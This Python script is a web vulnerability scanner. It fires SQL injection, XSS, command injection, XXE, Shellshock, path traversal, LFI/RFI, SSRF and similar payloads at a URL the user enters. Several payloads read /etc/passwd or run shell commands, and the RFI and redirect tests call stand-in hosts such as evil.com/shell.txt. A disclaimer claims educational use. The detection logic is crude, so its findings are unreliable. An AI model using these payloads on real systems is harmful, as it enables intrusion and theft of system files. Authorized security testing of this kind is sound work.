import aiohttp
import asyncio
from aiohttp import FormData

"""
DISCLAIMER: This script is intended for educational purposes only. The author is not responsible for any misuse or damage caused by this script. 
It is the user's responsibility to ensure that they have proper authorization before using this script to scan any website or server. 
Unauthorized scanning or testing of websites without permission is illegal and unethical. Use this script responsibly and only on systems you own or have explicit permission to test.
"""

async def fetch(session, url, headers=None, allow_redirects=True):
    async with session.get(url, headers=headers, allow_redirects=allow_redirects) as response:
        return await response.text()

async def fetch_post(session, url, data=None, headers=None):
    async with session.post(url, data=data, headers=headers) as response:
        return await response.text()

async def check_sql_injection(session, url):
    sql_payloads = ["'", "' OR '1'='1", "' OR '1'='1' -- "]
    for payload in sql_payloads:
        test_url = f"{url}{payload}"
        response_text = await fetch(session, test_url)
        if "error" in response_text or "syntax" in response_text:
            return True, payload
    return False, None

async def check_xss(session, url):
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in xss_payloads:
        test_url = f"{url}{payload}"
        response_text = await fetch(session, test_url)
        if payload in response_text:
            return True, payload
    return False, None

async def check_command_injection(session, url):
    cmd_payloads = ["; ls", "&& ls", "| ls"]
    for payload in cmd_payloads:
        test_url = f"{url}{payload}"
        response_text = await fetch(session, test_url)
        if "bin" in response_text or "root" in response_text:
            return True, payload
    return False, None

async def check_directory_traversal(session, url):
    traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in traversal_payloads:
        test_url = f"{url}{payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "root:" in response_text or "[extensions]" in response_text:
            return True, payload
    return False, None

async def check_rfi(session, url):
    rfi_payloads = ["http://evil.com/shell.txt", "http://malicious.com/malware.txt"]
    for payload in rfi_payloads:
        test_url = f"{url}?file={payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "shell" in response_text or "malware" in response_text:
            return True, payload
    return False, None

async def check_lfi(session, url):
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in lfi_payloads:
        test_url = f"{url}?file={payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "root:" in response_text or "[extensions]" in response_text:
            return True, payload
    return False, None

async def check_open_redirect(session, url):
    redirect_payloads = ["http://evil.com", "http://malicious.com"]
    for payload in redirect_payloads:
        test_url = f"{url}?redirect={payload}"
        async with session.get(test_url, allow_redirects=False) as response:
            if response.status == 301 or response.status == 302:
                location = response.headers.get("Location")
                if location == payload:
                    return True, payload
    return False, None

async def check_ssrf(session, url):
    ssrf_payloads = ["http://localhost:80", "http://127.0.0.1:80"]
    for payload in ssrf_payloads:
        test_url = f"{url}?url={payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "localhost" in response_text or "127.0.0.1" in response_text:
            return True, payload
    return False, None

async def check_csrf(session, url):
    csrf_payloads = ["<form action='{url}' method='POST'><input type='hidden' name='csrf' value='csrf_token'></form>"]
    for payload in csrf_payloads:
        response_text = await fetch_post(session, url, data={"csrf": "csrf_token"})
        if "csrf_token" in response_text:
            return True, payload
    return False, None

async def check_xxe(session, url):
    xxe_payloads = ["<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"]
    for payload in xxe_payloads:
        headers = {'Content-Type': 'application/xml'}
        response_text = await fetch_post(session, url, data=payload, headers=headers)
        if "root:" in response_text:
            return True, payload
    return False, None

async def check_insecure_deserialization(session, url):
    deserialization_payloads = ["O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"]
    for payload in deserialization_payloads:
        response_text = await fetch_post(session, url, data=payload)
        if "test" in response_text:
            return True, payload
    return False, None

async def check_path_traversal(session, url):
    path_traversal_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in path_traversal_payloads:
        test_url = f"{url}?file={payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "root:" in response_text or "[extensions]" in response_text:
            return True, payload
    return False, None

async def check_file_upload(session, url):
    file_upload_payloads = [("file", ("test.php", "<?php echo 'test'; ?>", "application/x-php"))]
    for payload in file_upload_payloads:
        form = FormData()
        form.add_field('file', payload[1][1], filename=payload[1][0], content_type=payload[1][2])
        async with session.post(url, data=form) as response:
            response_text = await response.text()
            if "test" in response_text:
                return True, payload
    return False, None

async def check_http_header_injection(session, url):
    header_injection_payloads = ["injected"]
    for payload in header_injection_payloads:
        headers = {'User-Agent': payload}
        response_text = await fetch(session, url, headers=headers)
        if "injected" in response_text:
            return True, payload
    return False, None

async def check_ldap_injection(session, url):
    ldap_payloads = ["*)(uid=*))(|(uid=*"]
    for payload in ldap_payloads:
        test_url = f"{url}?search={payload}"
        response_text = await fetch(session, test_url)
        if "uid=" in response_text:
            return True, payload
    return False, None

async def check_smtp_injection(session, url):
    smtp_payloads = ["\r\nRCPT TO:<injected@example.com>"]
    for payload in smtp_payloads:
        test_url = f"{url}?email={payload}"
        response_text = await fetch(session, test_url, allow_redirects=False)
        if "250" in response_text:
            return True, payload
    return False, None

async def check_xpath_injection(session, url):
    xpath_payloads = ["' or '1'='1"]
    for payload in xpath_payloads:
        test_url = f"{url}?search={payload}"
        response_text = await fetch(session, test_url)
        if "result" in response_text:
            return True, payload
    return False, None

async def check_shellshock(session, url):
    shellshock_payloads = ["() { :;}; echo; /bin/cat /etc/passwd"]
    for payload in shellshock_payloads:
        headers = {'User-Agent': payload}
        response_text = await fetch(session, url, headers=headers)
        if "root:" in response_text:
            return True, payload
    return False, None

async def check_buffer_overflow(session, url):
    buffer_overflow_payloads = ["A" * 10000]
    for payload in buffer_overflow_payloads:
        response_text = await fetch_post(session, url, data=payload)
        if "500" in response_text:
            return True, payload
    return False, None

async def main():
    url = input("Enter the URL to scan: ")
    vulnerabilities_found = False

    async with aiohttp.ClientSession() as session:
        tasks = [
            check_sql_injection(session, url),
            check_xss(session, url),
            check_command_injection(session, url),
            check_directory_traversal(session, url),
            check_rfi(session, url),
            check_lfi(session, url),
            check_open_redirect(session, url),
            check_ssrf(session, url),
            check_csrf(session, url),
            check_xxe(session, url),
            check_insecure_deserialization(session, url),
            check_path_traversal(session, url),
            check_file_upload(session, url),
            check_http_header_injection(session, url),
            check_ldap_injection(session, url),
            check_smtp_injection(session, url),
            check_xpath_injection(session, url),
            check_shellshock(session, url),
            check_buffer_overflow(session, url)
        ]

        results = await asyncio.gather(*tasks)

        for result, check_name in zip(results, [
            "SQL Injection", "XSS", "Command Injection", "Directory Traversal",
            "Remote File Inclusion", "Local File Inclusion", "Open Redirect",
            "Server-Side Request Forgery", "Cross-Site Request Forgery",
            "XML External Entity", "Insecure Deserialization", "Path Traversal",
            "File Upload", "HTTP Header Injection", "LDAP Injection",
            "SMTP Injection", "XPath Injection", "Shellshock", "Buffer Overflow"
        ]):
            if result[0]:
                payload_display = result[1] if len(result[1]) <= 100 else result[1][:100] + '...'
                print(f"The URL is vulnerable to {check_name} with payload: {payload_display}")
                vulnerabilities_found = True

        if not vulnerabilities_found:
            print("No vulnerabilities found.")

if __name__ == "__main__":
    asyncio.run(main())